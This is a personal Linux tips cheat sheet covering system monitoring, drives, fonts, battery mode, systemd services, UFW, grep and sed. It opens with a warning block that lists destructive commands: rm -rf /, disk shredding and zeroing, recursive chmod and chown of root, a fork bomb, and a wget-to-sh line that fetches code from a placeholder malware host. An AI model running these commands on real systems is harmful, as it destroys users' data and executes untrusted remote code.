### Linux tips.

#### BECAREFUL!
```sh

rm -rf /            # Remove ALL data
shred /dev/sda      # Remove ALL data
mkfs.ext3 /dev/sda  # with formatting to Ext3

sudo dd if=/dev/zero of=/dev/sda bs=8m # Write with zeros the 40mb from begin

chmod -Rv 000 /          # Remove All Accesses to All files.
chown -R nobody:nobody / # Set NOBODY as OWNER for all.
chmod -R 777 /           # Allow ANYBODY to do EVERYTHING in the system

:(){ :|:& };: # "fork bomb" to Fully fill All Memory (until boot)

some_cmd > some_cfg_file.conf # Overwrite Config that can broke smth.

wget http://some_MALWARE_site -O- | sh # Download and run Malawre))

```
#### LINUX PATH CHEATSHEET:

|  Path  |   Description
|--------|----------------------
| /bin   | USER BINARIES
| /sbn   | SYSTEM BINARIES
| /etc   | CONFIGURATION FILES
| /dev   | DEVICE FILES
| /proc  | PROCESS INFORMATION
| /var   | VARIABLE FILES
| /tmp   | TEMPORARY FILES
| /usr   | USER SYS RESOURCES
| /home  | HOME DIRECTORIES
| /boot  | BOOT LOADER FILES
| /lib   | SYSTEM LIBRARIES
| /opt   | OPTIONAL ADD ON APPS
| /mnt   | MOUNT DIRECTORY
| /media | REMOVABLE DEVICES
| /srv   | SERVICE DATA

#### SYSTEM MONITORING:
```sh
journalctl -S "yyyy-MM-dd HH:mm:ss" --user

# -Reverse -Kernel0related -NumbersToShow
journalctl -r -k -n 10

journalctl --list-boots
# Latest Boot.
journalctl -b -0

journalctl --since yesterday --until 2029-12-31 12:00:00

journalctl --no-page # with no 'less' option

journalctl -o json-pretty >> ~/Desktop/journalctl.json

# SERVICES:
systemctl list-unit-files --type=service

### FIND:
# in root, Dir, Insensitive, NamePart (with out Errors to Null)
find / -type d  -iname  *viber*  2>/dev/null

#### DRIVES:
lsblk
#
smartctl -a /dev/sda
smartctl -a /dev/nvme1n1

#### SPACE USAGE:
df -h
#
du -sh /tmp # tmp dir size
#
df -i # see inodes

#### USAGE:
iotop # current io reads-writes

#### NETWORK devices:
inxi -Naz
#
netstat -tulpn # ports usage
ss -lntu # similar

#### MEMORY:
free -m

#### PROCESS KILL unsafety:
kill -9 proc_id

#### PROCESS Config Re-Read
kill -1 proc_id

#### REBOOT History
last reboot

#### FILES OPENED from Dir 
lsof /home/user1

#### FILES OPENED by Process
lsof -p proc_id

#### KERNEL Modeles Uploaded 
lsmod

#### PROCESSES as a Tree 
pstree
# or
ps -e -o pid,args --forest

#### PROCESSES Detailed (snapshot)
ps -eafw

#### DRIVE SMART availability
smartctl -i /dev/hda

#### DRIVE SMART start
smartctl -A /dev/hda

#### PROCESS input\output calls stack (process 'ls')
strace -c ls >/dev/null

#### PROCESS system calls (process 'ls')
strace -f -e open ls >/dev/null

#### LOG SYSTEM (last 10)
tail /var/log/messages

#### LOG KERNEL UPLOAD (last 10)
tail /var/log/dmesg

#### PROCESSES (realtime)
top

#### INTERRUPTIONS (realtime)
watch -n1 'cat /proc/interrupts'

```

### VirtualBox Shared Folder access:
```sh
sudo usermod -a -G vboxsf $USER
```

### FONTS
```sh
# for ttf-mscorefonts-installer
add-apt-repository multiverse 
apt update && sudo apt upgrade -y

apt install -y fonts-cantarel fonts-cascadia-code ttf-mscorefonts-installer

dnf install -y 'google-roboto*' 'mozilla-fira*' fira-code-fonts

yay -S --needed ttf-caladea ttf-carlito ttf-dejavu ttf-liberation ttf-linux-libertine-g adobe-source-code-pro-fonts adobe-source-sans-pro-fonts adobe-source-serif-pro-fonts ttf-fira-code

wget https://fonts.google.com/download?family=JetBrains%20Mono -O ~/Desktop/jb_mono.zip
mkdir /usr/share/fonts/jb_mono/
unzip ~/Desktop/jb_mono.zip -d /usr/share/fonts/jb_mono/

wget https://fonts.google.com/download?family=PT%20Mono -O ~/Desktop/pt_mono.zip
mkdir /usr/share/fonts/pt_mono/
unzip ~/Desktop/pt_mono.zip -d /usr/share/fonts/pt_mono/

wget https://www.fontsquirrel.com/fonts/download/liberation-mono  -O ~/Desktop/liberation-mono.zip
mkdir /usr/share/fonts/liberation-mono/
unzip ~/Desktop/liberation-mono.zip -d /usr/share/fonts/liberation-mono/

wget https://fonts.google.com/download?family=Comfortaa -O ~/Desktop/Comfortaa.zip
mkdir /usr/share/fonts/Comfortaa/
unzip ~/Desktop/Comfortaa.zip -d /usr/share/fonts/Comfortaa/

wget https://github.com/githubnext/monaspace/releases/download/v1.000/monaspace-v1.000.zip -O ~/Desktop/Monaspace.zip
unzip ~/Desktop/Monaspace.zip -d ~/Desktop/Monaspace/
mkdir /usr/share/fonts/Monaspace
mv /home/aaa/Desktop/Monaspace/monaspace-v1.000/fonts/otf/* /usr/share/fonts/Monaspace/

fc-cache -fvh
# -f  = Force re-generation cache files, overriding the  timestamp checking.
# -r  = Erase all existing cache files and rescan.
# -v  = Display status information while busy.
# -h  = Show summary of options.
```
- https://github.com/loafer-mka/anka-coder-fonts
- https://www.fontsquirrel.com/fonts/download/BPmono
- https://fonts.google.com/specimen/PT+Mono
- https://www.programmingfonts.org


### TOUCHPAD disable on boot:
```sh
synclient TouchpadOff=1
```

### Check Temperatures:
```sh
sensors && sudo hddtemp /dev/sda && sudo hddtemp /dev/sdb
# or
ls /sys/class/hwmon/hwon2/
cat /sys/class/hwmon/hwmon2/temp1_input
```

#### Battery: Conservation Mode:
```sh
sudo su
# then Activate
echo 1 > /sys/bus/platform/drivers/ideapad_acpi/VPC2004:00/conservation_mode
# or Diactivate
echo 0 > /sys/bus/platform/drivers/ideapad_acpi/VPC2004:00/conservation_mode
```

### MyScriptLink.desktop
```sh
[Desktop Entry]
Name=myscript.sh
Exec=bash ./myscript.sh
Comment=
Terminal=true
Icon=cinnamon-panel-launcher
Type=Application
```
### MyScript.sh
```sh
#! /bin/bash
sudo apt update -y && sudo apt upgrade -y
$SHELL  
# $SHELL - is for stay terminal opened.
```

#### AutoRun Script on Boot:
```sh
nano /usr/local/sbin/ABC-SCRIPT.sh

#!/bin/bash
# Battery Conservation Activate
echo 1 > /sys/bus/platform/drivers/ideapad_acpi/VPC2004:00/conservation_mode

# or Diactivate
echo 0 > /sys/bus/platform/drivers/ideapad_acpi/VPC2004:00/conservation_mode

# Allow to Owner to read-write and Execute.
chmod 0700 /usr/local/sbin/ABC-SCRIPT.sh

# Create Service:
nano /etc/systemd/system/ABC-SCRIPT.service
#
[Unit]
Description=Battery Conservation Mode On.
[Service]
ExecStart=/usr/local/sbin/ABC-SCRIPT.sh
[Install]
WantedBy=multi-user.target

# Enable Service:
systemctl start ABC-SCRIPT.service
systemctl enable ABC-SCRIPT.service
```

#### TLP:
```sh
sudo apt install tlp tlp-rdw
sudo systemctl enable tlp.service
sudo systemctl start tlp.service
sudo systemctl status tlp.service
sudo tlp start
sudo tlp-stat
# config file:
/etc/default/tlp
```

#### Enable SSD-Trim:
```sh
sudo systemctl enable fstrim.timer
sudo systemctl start fstrim.timer
sudo systemctl status fstrim.timer
```

#### UFW:
```sh
sudo ufw enable
sudo systemctl enable ufw # ... ->
# Created symlink 
#/etc/systemd/system/multi-user.target.wants/ufw.service → /usr/lib/systemd/system/ufw.service
sudo ufw status
```

#### Celluloid (MPV) save video position on close:
```sh
mkdir ~/.config/mpv/ && echo "save-position-on-quit" >> ~/.config/mpv/mpv.conf
# Then select this file in the Celluloid menu.
```

#### Viber launch with tray icon:
(dbus-launch - Utility to start a message bus from a shell script)
```sh
dbus-launch /opt/viber/Viber
```

#### Create Desktop link:
```sh
# Find *.desktop first.
cd /usr/share/applications/ && ls (*AAAA-Part-Of-App-Name-Optionally*)
# same for Snap-Apps:
cd /var/lib/snapd/desktop/applications/ && ls

# Copy to Desktop:
cp /usr/share/applications/AAAA.desktop ~/Desktop/
# Allow to execute:
chmod 0700 ~/Desktop/AAAA.desktop
```

#### Default File browser:
```sh
# Check default file browser:
xdg-mime query default inode/directory
# Set Thunar as default file browser:
xdg-mime default thunar.desktop inode/directory
# or in
/usr/share/applications/mimeapps.list 
# setup (for example)
[Default Applications]
inode/directory=exfalso.desktop;nautilus.desktop;
```

#### GREP - Global Regular Expression Print
```sh
# Syntax    : grep [option] [pattern] [files]
# [options] :
-A num -> print num lines After Matching
-B num -> print num lines Before Matching
-L -----> List files that do NOT match the pattern
-c -----> Count total matched lines
-i -----> insensitive case
-l -----> List Files that match the pattern
-n -----> Number of output line
-r,-R --> Recursive search
-v -----> inVert match
# ----------------------------------------
grep ^[pattern] [files] # Lines that START with the pattern
grep [pattern]$ [files] # Lines that END with the pattern
grep -i ['pattern1\|pattern2'] [files] # Use of OR to check either of two patterns
grep -i ['pattern1.*pattern2'] [files] # Use of AND to check both two patterns
```

#### SED - Stream EDitor
```sh
sed 's/pattern/replacement/g' [file] # Substitute text 
sed 's/\bapple\b/orange/g' [file] > [new_file] # \b = Boundaries (only absolute! match)
sed '/pattern/d' [file] # Delete lines
```